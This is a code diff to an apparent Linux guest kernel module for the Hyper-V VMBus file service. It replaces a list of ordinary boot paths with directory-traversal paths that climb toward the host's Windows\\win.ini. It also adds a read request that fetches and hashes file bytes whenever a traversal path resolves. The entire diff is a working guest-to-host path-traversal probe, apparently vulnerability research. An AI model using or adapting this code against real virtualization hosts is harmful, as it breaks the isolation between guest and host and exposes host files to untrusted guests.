@@ -23,13 +23,22 @@ struct frame {
 } __packed;
 
 static const char *const paths[] = {
-	"\\",
-	"\\kernel",
-	"kernel",
-	"\\initrd",
-	"\\initrd.img",
-	"\\rootfs.vhd",
-	"\\missing-3900000",
+	"\\..\\Windows\\missing-3900000",
+	"\\..\\Windows\\win.ini",
+	"\\..\\..\\Windows\\missing-3900000",
+	"\\..\\..\\Windows\\win.ini",
+	"\\..\\..\\..\\Windows\\missing-3900000",
+	"\\..\\..\\..\\Windows\\win.ini",
+	"\\..\\..\\..\\..\\Windows\\missing-3900000",
+	"\\..\\..\\..\\..\\Windows\\win.ini",
+	"\\..\\..\\..\\..\\..\\Windows\\missing-3900000",
+	"\\..\\..\\..\\..\\..\\Windows\\win.ini",
+	"\\..\\..\\..\\..\\..\\..\\Windows\\missing-3900000",
+	"\\..\\..\\..\\..\\..\\..\\Windows\\win.ini",
+	"\\..\\..\\..\\..\\..\\..\\..\\Windows\\missing-3900000",
+	"\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini",
+	"\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\missing-3900000",
+	"\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini",
 };
 
 static struct vmbus_channel *channel;
@@ -114,6 +123,19 @@ static int send_info(unsigned int index)
 	return send_frame(VMBFS_GET_INFO_REQUEST, length);
 }
 
+static int send_read(unsigned int index)
+{
+	unsigned int length = path_bytes(index);
+	int i;
+
+	for (i = length - 1; i >= 0; i--)
+		tx.body[12 + i] = tx.body[i];
+	put32(tx.body, 16);
+	put64(tx.body + 4, 0);
+	phase = VMBFS_READ_RESPONSE;
+	return send_frame(VMBFS_READ_REQUEST, 12 + length);
+}
+
 static void hvraw_callback(void *context)
 {
 	u32 actual = 0;
@@ -150,15 +172,20 @@ static void hvraw_callback(void *context)
 
 			pr_info("VMBFS_INFO path=%s status=%u flags=%u size=%llu\n",
 				paths[path_index], status, flags, size);
-			if (++path_index < ARRAY_SIZE(paths)) {
+			if ((path_index & 1) && status == 0 && size) {
+				send_read(path_index);
+			} else if (++path_index < ARRAY_SIZE(paths)) {
 				send_info(path_index);
 			}
 		} else if (message == VMBFS_READ_RESPONSE) {
-			pr_info("VMBFS_READ path=%s status=%u returned=%u data=%*phN\n",
-				paths[path_index], status, actual - 20,
-				(int)min(actual - 20, 16u), rx + 20);
-			if (++path_index < ARRAY_SIZE(paths))
-				send_info(path_index);
+			u32 returned = pipe_length >= 12 ? pipe_length - 12 : 0;
+			u64 hash = 1469598103934665603ULL;
+			u32 index;
+
+			for (index = 0; index < min(returned, 16u); index++)
+				hash = (hash ^ rx[20 + index]) * 1099511628211ULL;
+			pr_info("VMBFS_READ path=%s status=%u returned=%u hash=%016llx\n",
+				paths[path_index], status, returned, hash);
 		}
 	} while (actual);
 }
